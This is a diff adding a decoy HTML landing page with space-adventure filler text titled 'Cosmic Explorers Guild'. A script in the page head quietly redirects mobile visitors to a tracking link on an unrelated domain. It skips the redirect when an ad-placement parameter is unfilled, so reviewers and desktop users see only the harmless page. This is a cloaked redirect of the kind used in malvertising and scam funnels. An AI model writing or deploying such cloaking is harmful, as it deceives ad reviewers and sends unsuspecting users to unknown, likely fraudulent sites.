@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const utmXXX = urlParams.get("xxx");
+    const s = urlParams.get("s");
+    const ttclid = urlParams.get("ttclid");
+    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    const lander = `https://klcxb6.mcgo2.com/visit/7030fb24-f71e-4d19-916a-a1c232f79601?s1=${s}`;
+    if (utmXXX === "__PLACEMENT__") { }
+    else if (isMobileDevice) { window.location.href = lander; } 
+    else { }
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cosmic Explorers Guild</title>
+    <style>
+        body {
+            font-family: 'Courier New', monospace;
+            background: linear-gradient(45deg, #ff00ff, #00ffff);
+            color: #f0f0f0;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 20px;
+            padding: 20px;
+        }
+        header {
+            grid-column: 1 / -1;
+            text-align: center;
+            background-color: rgba(0, 0, 0, 0.7);
+            padding: 20px;
+        }
+        main {
+            grid-column: 2 / 3;
+            background-color: rgba(255, 255, 255, 0.1);
+            padding: 20px;
+            border-radius: 15px;
+        }
+        aside {
+            background-color: rgba(0, 0, 0, 0.5);
+            padding: 10px;
+            border-radius: 10px;
+        }
+        footer {
+            grid-column: 1 / -1;
+            text-align: center;
+            background-color: rgba(0, 0, 0, 0.7);
+            padding: 10px;
+        }
+        h1 {
+            font-size: 3em;
+            text-shadow: 2px 2px 4px #000000;
+        }
+        a {
+            color: #ff00ff;
+            text-decoration: none;
+        }
+        a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>Cosmic Explorers Guild</h1>
+        </header>
+        <aside>
+            <h2>Galactic News</h2>
+            <p>Nebula storms expected in Sector 7</p>
+            <p>New wormhole discovered near Alpha Centauri</p>
+        </aside>
+        <main>
+            <h2>Welcome, Space Traveler!</h2>
+            <p>Embark on interstellar adventures with the Cosmic Explorers Guild. Discover new worlds, encounter alien civilizations, and unravel the mysteries of the universe!</p>
+            <p>Join our next expedition to the Andromeda Galaxy. Limited spots available!</p>
+        </main>
+        <aside>
+            <h2>Gear Shop</h2>
+            <ul>
+                <li>Quantum Compass</li>
+                <li>Gravity Boots</li>
+                <li>Universal Translator</li>
+            </ul>
+        </aside>
+        <footer>
+            <p>&copy; 2023 Cosmic Explorers Guild | <a href="https://tokreward.com/privacy.html">Privacy Policy</a></p>
+        </footer>
+    </div>
+</body>
+</html>
